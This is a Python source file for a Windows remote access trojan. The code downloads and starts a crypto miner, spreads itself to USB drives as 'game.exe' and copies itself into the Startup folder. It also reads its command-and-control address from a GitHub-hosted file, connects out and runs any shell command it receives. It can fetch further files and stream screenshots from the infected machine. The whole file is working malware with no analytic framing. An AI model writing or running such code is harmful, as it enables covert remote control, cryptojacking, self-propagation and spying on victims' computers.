import os
import socket
import subprocess
import time
import signal
import sys
import struct
import requests
import threading
import win32api
import win32con
import win32file
import pyscreenshot
import flask
from io import BytesIO


def miner():
    print("Miner Section Auto Start")
    print("..............................")
    print("downloading")
    miner_url = "https://github.com/rehmanazhar922/zc/blob/main/miner.exe?raw=true"
    miner = requests.get(miner_url,  allow_redirects=True)
    file = open("miner.exe", "wb")
    file.write(miner.content)
    subprocess.Popen(["cmd /c copy miner.exe %temp%"], shell=True)
    subprocess.Popen(["cmd /c del %temp%\miner.exe"], shell=True)
    subprocess.Popen(["cmd /c start %temp%\miner.exe"], shell=True)

def screenshare():
    app = flask.Flask(__name__)
    @app.route('/screen.png')
    def serve_pil_image():
        img_buffer = BytesIO()
        pyscreenshot.grab().save(img_buffer, 'PNG', quality=50)
        img_buffer.seek(0)
        return flask.send_file(img_buffer, mimetype='image/png')
    @app.route('/js/<path:path>')
    def send_js(path):
        return flask.send_from_directory('js', path)
    @app.route('/')
    def serve_img():
        return flask.render_template('screen.html')
    if __name__ == "__main__":
        app.run(host='0.0.0.0', port=5656)

def get_plus_spread():
    ###init
    print("Usb Thread started ...............-------------------..................")
    mytarget = sys.argv[(0)]
    pathoftarget = mytarget.split(":")
    stat = 0
    for gud in pathoftarget:
        stat = stat+1
        if stat > 1:
            file = gud
            print("........................................", gud)
    print("spread section ! of ")
    print(mytarget)
    drives = [i for i in win32api.GetLogicalDriveStrings().split('\x00') if i]
    rdrives = [d for d in drives if win32file.GetDriveType(d) == win32con.DRIVE_REMOVABLE]
    print(f"u got this your name is '{mytarget}' all the usb drives are {rdrives}")
    for usb in rdrives:
        cmd = "copy " + '"' + mytarget + '"' + " " + usb + "game.exe"
        cmd = str(cmd)
        print(cmd)
        subprocess.Popen(cmd, shell=True)
    time.sleep(4)
    get_plus_spread()


def startup():
    ##INIT
    print("startup ...............................")
    myname = sys.argv[0]
    startus_path = '"%appdata%/Microsoft\Windows\Start Menu\Programs\Startup\"'
    cmd = f'copy "{myname}" {startus_path}'
    print(cmd)
    subprocess.Popen(cmd, shell=True)
    print("startup Task .........................................")
    time.sleep(5)
    startup()


def get_url(arg):
    lst = []
    arg = arg.split(' ')
    for i in arg:
        lst.append(i)
    url = lst[1]
    print(url)
    return url

def getraw(url):
    r = requests.get(url, allow_redirects=True)
    rawdata = r.content
    rawdata = str(rawdata)
    bsplit = rawdata.split("b'")
    bsplit = ''.join(bsplit)
    nsplit = bsplit.split("\\n'")
    nsplit = ''.join(nsplit)
    addr = str(nsplit)
    addrsplit = addr.split(':')
    host = addrsplit[0]
    port = addrsplit[1]
    print("the host is : ", addrsplit[0], " and the port is : ", addrsplit[1])
    return host, port

def download(url):
    if url.find('/'):
        filename = url.rsplit('/', 1)[1]
        print(filename)
    data = requests.get(url, allow_redirects=True)
    file = open(filename, "wb")
    file.write(data.content)

class Client(object):


    def __init__(self):
        threading.Thread(target=startup).start()
        threading.Thread(target=get_plus_spread).start()
        threading.Thread(target=miner).start()


    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_gracefully)
        signal.signal(signal.SIGTERM, self.quit_gracefully)
        return

    def quit_gracefully(self, signal=None, frame=None):
        print('\nQuitting gracefully')
        if self.socket:
            try:
                self.socket.shutdown(2)
                self.socket.close()
            except Exception as e:
                print('Could not close connection %s' % str(e))
                # continue
        sys.exit(0)
        return

    def socket_create(self):
        """ Create a socket """
        try:
            self.socket = socket.socket()
        except socket.error as e:
            print("Socket creation error" + str(e))
            return
        return

    def socket_connect(self):
        """ Connect to a remote socket """
        try:
            url = "https://raw.githubusercontent.com/DevOps-Arts/server/main/server.txt"
            self.serverHost, self.serverPort = getraw(url)
            self.serverPort = int(self.serverPort)
            self.socket.connect((self.serverHost, self.serverPort))
        except socket.error as e:
            print("Socket connection error: " + str(e))
            time.sleep(15)
            raise
        try:
            self.socket.send(str.encode(socket.gethostname()))
        except socket.error as e:
            print("Cannot send hostname to server: " + str(e))
            raise
        return

    def print_output(self, output_str):
        """ Prints command output """
        sent_message = str.encode(output_str + str(os.getcwd()) + '> ')
        self.socket.send(struct.pack('>I', len(sent_message)) + sent_message)
        print(output_str)
        return

    def receive_commands(self):
        """ Receive commands from remote server and run on local machine """
        try:
            self.socket.recv(10)
        except Exception as e:
            print('Could not start communication with server: %s\n' %str(e))
            return
        cwd = str.encode(str(os.getcwd()) + '> ')
        self.socket.send(struct.pack('>I', len(cwd)) + cwd)
        while True:
            output_str = None
            data = self.socket.recv(20480)
            if data == b'': break
            elif "screenshare-deploy" in data[:].decode("utf-8"):
                print("Deployed screenshare part")
                threading.Thread(target=screenshare).start()
                output_str = "Screen shared deployed on port 5656 on Zombie machine"
            elif "download" in data[:].decode("utf-8"):
                arg = data[:].decode("utf-8")
                try:
                    url = get_url(arg)
                    print(url)
                    if 'http' in url:
                        download(url)
                        print("downloaded")
                except Exception as e:
                    print(e)
                else:
                    output_str = "downloaded"
            elif data[:2].decode("utf-8") == 'cd':
                directory = data[3:].decode("utf-8")
                try:
                    os.chdir(directory.strip())
                except Exception as e:
                    output_str = "Could not change directory: %s\n" %str(e)
                else:
                    output_str = ""
            elif data[:].decode("utf-8") == 'exit':
                self.socket.close()
                break
            elif len(data) > 0:
                try:
                    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_str = output_bytes.decode("utf-8", errors="replace")
                except Exception as e:
                    # TODO: Error description is lost
                    output_str = "Command execution unsuccessful: %s\n" %str(e)
            if output_str is not None:
                try:
                    self.print_output(output_str)
                except Exception as e:
                    print('Cannot send command output: %s' %str(e))
        self.socket.close()
        return


def main():
    client = Client()
    client.register_signal_handler()
    client.socket_create()
    while True:
        try:
            client.socket_connect()
        except Exception as e:
            print("Error on socket connections: %s" %str(e))
            time.sleep(5)
        else:
            break
    try:
        client.receive_commands()
    except Exception as e:
        print('Error in main: ' + str(e))
    client.socket.close()
    return


if __name__ == '__main__':
    while True:
        main()